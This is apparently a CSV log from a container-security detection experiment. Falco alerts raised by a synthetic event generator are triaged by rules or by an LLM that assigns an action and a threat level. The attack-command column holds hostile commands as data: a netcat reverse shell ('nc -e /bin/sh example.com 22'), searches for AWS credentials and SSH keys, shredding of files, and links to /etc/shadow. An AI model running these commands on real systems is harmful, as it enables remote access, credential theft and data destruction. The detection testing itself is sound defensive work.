timestamp,event_type,rule_name,priority,prompt_tokens,completion_tokens,latency_ms,remediation_status,remediation_action,mitre_technique,target_container,attack_source,attack_label,attack_id,container_id,container_image,event_source,experiment_mode,ground_truth,rule_matched,llm_called,cache_hit,cache_key,gate_decision,llm_action,llm_threat_level,cache_ttl
2026-05-17T10:45:12.162746,llm-analyzed,Read sensitive file trusted after startup,Warning,381,56,9124,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:45:22.088895,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,383,53,8345,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:45:33.160696,llm-analyzed,Find AWS Credentials,Warning,367,70,9487,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:45:44.498819,llm-analyzed,Remove Bulk Data from Disk,Warning,385,73,9757,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-1257058840,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:45:55.644384,llm-analyzed,Execution from /dev/shm,Warning,408,68,9564,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-wSJ2IH.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,ignore,none,
2026-05-17T10:46:05.004730,llm-analyzed,Execution from /dev/shm,Warning,430,50,7782,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-wSJ2IH.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:46:15.449614,llm-analyzed,Clear Log Activities,Warning,342,78,8864,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:46:25.894699,llm-analyzed,Create Symlink Over Sensitive Files,Warning,408,55,8864,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-87276934/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:46:36.390509,llm-analyzed,Directory traversal monitored file read,Warning,350,78,8913,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:46:46.617044,llm-analyzed,Read sensitive file trusted after startup,Warning,381,62,8645,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:46:58.229806,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,383,87,10030,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:47:08.312715,llm-analyzed,Find AWS Credentials,Warning,367,63,8494,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:47:19.571904,llm-analyzed,Remove Bulk Data from Disk,Warning,381,81,9677,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-28908837,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:47:37.625793,llm-analyzed,Execution from /dev/shm,Warning,410,207,16475,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-t4aVVv.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:47:47.713543,llm-analyzed,Execution from /dev/shm,Warning,433,63,8507,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-t4aVVv.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:47:56.906928,llm-analyzed,Clear Log Activities,Warning,343,53,7613,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:48:08.557794,llm-analyzed,Create Symlink Over Sensitive Files,Warning,414,80,10068,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-3474911395/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,stop,high,
2026-05-17T10:48:10.137493,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:48:20.933270,llm-analyzed,Packet socket created in container,Notice,363,78,9214,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:48:22.517912,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:48:24.108843,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:48:34.518636,llm-analyzed,Fileless execution via memfd_create,Critical,376,66,8828,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:48:45.058953,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,52,8954,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-1954026859/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:48:54.972931,llm-analyzed,System user interactive,Informational,314,78,8333,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:48:56.552789,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:49:06.854833,llm-analyzed,PTRACE anti-debug attempt,Notice,331,80,8722,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,stop,medium,
2026-05-17T10:49:08.434984,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:49:17.782188,llm-analyzed,Search Private Keys or Passwords,Warning,342,58,7768,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:49:27.899350,llm-analyzed,Read sensitive file trusted after startup,Warning,381,60,8538,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:49:39.883648,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,384,85,10399,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:49:50.655576,llm-analyzed,Find AWS Credentials,Warning,367,51,9176,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:50:02.015563,llm-analyzed,Remove Bulk Data from Disk,Warning,385,82,9779,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3864659558,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:50:14.530823,llm-analyzed,Execution from /dev/shm,Warning,410,47,10935,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-xs2H2j.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:50:25.182174,llm-analyzed,Execution from /dev/shm,Warning,433,73,9065,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-xs2H2j.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:50:34.268979,llm-analyzed,Clear Log Activities,Warning,343,50,7505,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:50:44.599152,llm-analyzed,Create Symlink Over Sensitive Files,Warning,414,51,8749,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1807769247/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,high,
2026-05-17T10:50:46.180027,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:50:56.448002,llm-analyzed,Packet socket created in container,Notice,363,67,8688,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:50:58.029679,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:50:59.623077,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:51:10.171936,llm-analyzed,Fileless execution via memfd_create,Critical,376,67,8967,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
